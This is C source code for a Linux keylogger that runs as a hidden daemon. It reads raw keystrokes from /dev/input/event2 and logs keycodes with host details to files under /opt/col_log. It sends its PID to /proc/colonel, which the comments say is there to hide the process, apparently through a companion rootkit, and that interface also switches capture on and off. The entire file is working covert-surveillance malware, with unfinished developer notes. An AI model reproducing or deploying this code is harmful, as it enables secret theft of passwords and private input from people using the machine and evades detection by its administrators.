// REMOVE PRINTF WHEN DONE --- DYNAMICALLY FIND EVENT!!!!
// Maybe use structs input_handle, input_dev, input_handler, or input_dev to determine dev/input/eventX
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/input.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <time.h>
#include <fcntl.h>


int main(void) {
	FILE *fp = NULL;
	FILE *evlog;
	int ftty;
	int fd;
	int dir;
	struct utsname unameData;
	uname(&unameData);
	char listening = 0;
	char cmd[1024];
	char kl[13] = "keylogger: 1";
	char *toggle;
	struct input_event ev;									/* using input_event so we know 
															 * what we're reading from the 
															 * event file */
	pid_t process_id = 0;
	pid_t sid = 0;
	process_id = fork();									/* fork a child process */

	if (process_id < 0) {
		printf("ERROR: fork failure\n");
		exit(1);
	}
	if (process_id > 0) {
		// REMOVE printf WHEN DONE
		printf("process_id of child process %d\n", process_id);
		exit(0);
	}

	umask(0);												/* unmask the file mode */
	sid = setsid();											/* set unique session for 
															 * child process */
	if (sid < 0) {
		exit(1);
	}

	chdir("/opt/");											/* change daemon working directory */

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	dir = mkdir("./col_log", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);	/* log directory */
	fp = fopen("./col_log/log.txt", "a+"); 					/* daemon log */
	evlog = fopen("./col_log/evlog.txt", "a+");  			/* key log */
	fd = open("/dev/input/event2", O_RDONLY);				/* key event file */
	ftty = open("/proc/colonel", O_WRONLY);					/* open for write to hide keylogger pid */

	time_t curtime;
	time(&curtime);

	pid_t child_pid = getpid();								/* get keylogger pid */
	char dpid[10];								 	

	sprintf(dpid, "hp%jd", (intmax_t)child_pid);			/* forms command */
	write(ftty, dpid, sizeof(dpid));						/* passes command to the colonel */
	fprintf(fp, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));	/* records current pid to log */
	close(ftty);
	
	if (!ftty) {
		fprintf(fp, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
		return 1;
	}
	// findev = open('/proc/bus/input/devices', O_RDONLY);
/*
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
*/	
	if (geteuid() != 0) {									/* check if user is root */
		fprintf(fp, "ERROR: user not root -- %s", ctime(&curtime));
		return 1;
	}
	if (NULL == evlog) {
		fprintf(fp, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
		return 1;
	}

	fprintf(evlog, "\n\n%s", ctime(&curtime));				/* timestamp */
	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 			/* system data */
			unameData.nodename, unameData.version,
			unameData.sysname, unameData.release, 
			unameData.machine);
	fflush(evlog);

	while(1) {				
		fflush(fp);
		read(fd, &ev, sizeof(struct input_event));			/* read from /dev/input/eventX */
		ftty = open("/proc/colonel", O_RDONLY);				/* read from /proc/colonel */
		read(ftty, cmd, sizeof(cmd));						/* read from /proc/colonel */
		toggle = strstr(cmd, kl);							/* looks for change in /proc/colonel */

		if ((0 == listening) && (toggle != NULL)) {
			listening = !listening;
			fprintf(fp, "Begin listening -- %s", ctime(&curtime));
			close(ftty);
			continue;

		} else if ((1 == ev.type) && (1 == listening)) {	/* if typing (ev.type = 1) and keylogger is on */
			fprintf(evlog, "%i,%i-", ev.code, ev.value);	/* grabs keyboard input -- 
															 * ev.code = keycode
															 * ev.value = key state (0: key up, 1: key down) */
			fflush(evlog);

			ftty = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
			if (NULL == toggle) {
				listening = !listening;
				fprintf(fp, "End listening -- %s", ctime(&curtime));
				close(ftty);
				continue;
			}
		}
	}

	fclose(evlog);
	fclose(fp);
	return 0;
}